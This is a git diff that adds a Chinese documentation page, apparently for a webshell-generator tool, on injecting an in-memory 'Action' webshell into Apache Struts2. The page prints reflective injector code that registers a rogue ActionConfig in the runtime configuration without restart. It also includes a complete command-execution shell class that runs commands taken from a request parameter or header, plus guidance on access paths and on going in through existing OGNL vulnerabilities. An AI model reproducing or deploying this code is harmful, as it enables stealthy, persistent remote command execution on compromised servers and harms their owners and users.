@@ -1,5 +1,119 @@
 ---
 title: Struts2 框架内存马
+description: Action，向 Struts2 运行时配置注册新的 Action
 ---
 
+> [官方文档 - Struts2](https://struts.apache.org/core-developers/)
+
 ## Action 内存马
+
+Struts2 基于 XWork 的 MVC 框架。`StrutsPrepareAndExecuteFilter` 拦截请求后交给 `Dispatcher`；`ActionMapper` 解析 URL 得到 namespace 与 actionName，`Dispatcher` 从 `Configuration` 的运行时配置中取出对应的 `ActionConfig`，创建 `ActionProxy` / `ActionInvocation`，最后通过 OGNL 调用 Action 的 `execute()`。
+
+Action 配置在运行时保存在 `RuntimeConfigurationImpl.namespaceActionConfigs` 中：
+
+```text
+Map<namespace, Map<actionName, ActionConfig>>
+```
+
+注入器不需要修改 `struts.xml`，也不需要重启：它把 shell 包装成新的 `ActionConfig`，直接写进这个 map。
+
+## ActionContext
+
+`ActionContext` 是 Struts2 的线程上下文，`ActionContext.getContext()` 通过 ThreadLocal 返回当前请求的上下文。Action 里获取 request / response 也是从这里取：
+
+```java
+Class<?> clazz = Class.forName("com.opensymphony.xwork2.ActionContext");
+Object context = clazz.getMethod("getContext").invoke(null);
+Method getMethod = clazz.getMethod("get", String.class);
+HttpServletRequest request = (HttpServletRequest) getMethod.invoke(context,
+        "com.opensymphony.xwork2.dispatcher.HttpServletRequest");
+HttpServletResponse response = (HttpServletResponse) getMethod.invoke(context,
+        "com.opensymphony.xwork2.dispatcher.HttpServletResponse");
+```
+
+注入器同样依赖它。`getContext()` 本身是 ThreadLocal，注入器遍历线程的 TCCL 只是为了找到能加载 `struts2-core` 的类加载器；真正取到的是当前线程绑定的上下文。因此注入必须发生在已经进入 Struts2 `ActionInvocation` 的请求线程里，例如已有的 Action / OGNL 漏洞入口。普通 Servlet 请求或非请求线程拿不到上下文；已经进入 Struts2 但尚未创建 `ActionInvocation` 的请求，`ActionContext` 存在而 `ActionInvocation` 为空，同样无法注入。
+
+## 注册 Action
+
+拿到当前 `ActionContext` 后，注入器沿 `ActionInvocation`、`ActionProxy`、`Configuration` 找到运行时配置（下面省略反射构造 `ActionConfig` 的细节）：
+
+```java
+Object actionInvocation = invokeMethod(context, "getActionInvocation");
+Object actionProxy = getFieldValue(actionInvocation, "proxy");
+Object configuration = getFieldValue(actionProxy, "configuration");
+Object runtimeConfiguration = getFieldValue(configuration, "runtimeConfiguration");
+Map<String, Map<String, Object>> namespaceActionConfigs =
+        (Map<String, Map<String, Object>>) getFieldValue(runtimeConfiguration, "namespaceActionConfigs");
+
+String actionName = getUrlPattern().substring(1);
+for (Map.Entry<String, Map<String, Object>> entry : namespaceActionConfigs.entrySet()) {
+    Map<String, Object> configs = entry.getValue();
+    if (configs.isEmpty() || configs.containsKey(actionName)) {
+        continue;
+    }
+    // 反射创建 ActionConfig：类名指向 shell，构造时参考该 namespace 已有 Action 的配置
+    configs.put(actionName, createActionConfig(entry.getKey(), configs, getClassName()));
+}
+```
+
+`urlPattern` 必须是 `/<actionName>`，注入器用 `substring(1)` 去掉前导 `/` 得到 actionName。它会遍历已经加载的 namespace，为每个**配置不为空**（至少已有一个 Action）的 namespace 注册同名 Action；如果某个 namespace 已经存在同名 Action，则跳过该 namespace，不覆盖业务 Action。配置为空的 namespace 会被跳过，因为注入器需要从已有 Action 中读取配置信息。
+
+## ActionShell
+
+Struts2 通过 ObjectFactory 为每个请求实例化 Action，并调用 `execute()`。shell 是一个普通 POJO：
+
+```java
+public class CommandStruts2Action {
+    private static String paramName;
+
+    public String execute() throws Exception {
+        Class<?> clazz = Class.forName("com.opensymphony.xwork2.ActionContext");
+        Object context = clazz.getMethod("getContext").invoke(null);
+        Method getMethod = clazz.getMethod("get", String.class);
+        HttpServletRequest request = (HttpServletRequest) getMethod.invoke(context,
+                "com.opensymphony.xwork2.dispatcher.HttpServletRequest");
+        HttpServletResponse response = (HttpServletResponse) getMethod.invoke(context,
+                "com.opensymphony.xwork2.dispatcher.HttpServletResponse");
+
+        String p = request.getParameter(paramName);
+        if (p == null || p.isEmpty()) {
+            p = request.getHeader(paramName);
+        }
+        if (p != null) {
+            InputStream inputStream = getInputStream(getParam(p));
+            response.getWriter().println(new Scanner(inputStream).useDelimiter("\\A").next());
+            response.getWriter().flush();
+            response.getWriter().close();
+        }
+        return null;
+    }
+}
+```
+
+1. Action 不通过方法参数接收 request / response，必须从 `ActionContext` 的两个固定 key 取。
+2. 先取 query / form 参数，再取同名请求头；`paramName` 由生成器写入。
+3. 命中后直接向 response 写命令输出并关闭 writer。
+4. 返回 `null` 而不是 `SUCCESS`：Struts2 看到没有 result code，就不会再渲染 result 页面，响应已经由 shell 写出。未命中参数时同样返回 null，得到一个空响应。
+
+## 访问路径
+
+注入器会在每个配置不为空的 namespace 尝试注册一份 Action，访问路径由 namespace 决定：
+
+| namespace | 访问路径 |
+| --- | --- |
+| `""`（根 namespace） | `/<actionName>` |
+| `/admin` | `/admin/<actionName>` |
+
+例如 URL Pattern 填 `/shell`，根 namespace 的访问地址就是 `/shell`；如果 `/admin` namespace 已有 Action，注入器也会在其中注册一份，`/admin/shell` 同样可访问。根 namespace 的 key 是空字符串 `""`，只要已有 Action 就会被注册；注入器只跳过配置为空的 namespace。它只处理注入时已存在的 namespace，之后新增的 namespace 不会单独注册，但 Struts2 查找不到 Action 时会回退到根 namespace，根 namespace 的 shell 仍可能在这些路径上命中。
+
+## 限制
+
+**URL Pattern 必填。** 生成时填写 `/<actionName>`，只用一个路径段。Web 表单对 `Action` 没有强制校验，留空会在 `substring(1)` 时失败；`/` 会得到空 actionName，`/*` 也不会按通配符匹配请求（通配符匹配器在注入前已经构建），都应避免。
+
+**必须由 Struts2 请求触发注入。** 注入器依赖当前线程的 `ActionContext` 和 `ActionInvocation`，要借助已有的 Action / OGNL 漏洞入口执行，不能从任意 Servlet 请求注入。
+
+**不能覆盖已有 Action。** 同名 Action 已存在的 namespace 会被跳过；需要换一个未被占用的 actionName。
+
+**依赖 struts2-core 与 Web 应用类加载器。** shell 被 defineClass 到 `ActionContext` 所在的类加载器，ObjectFactory 才能按类名加载到它。classpath 中没有 `struts2-core` 时注入器不会工作。
+
+**版本与内部结构。** 当前集成验证基于 `struts2-core` 2.5.30 与 `javax.servlet`。注入依赖 `ActionInvocation.proxy`、`ActionProxy.configuration`、`Configuration.runtimeConfiguration`、`RuntimeConfigurationImpl.namespaceActionConfigs` 以及 `ActionConfig` 的 protected 构造器；更高版本或迁移到 Jakarta 的 Struts2 需要重新确认。底层 Servlet 容器已有对应内存马时，仍优先选择容器内存马，Action 马会受 Struts2 过滤器链约束。
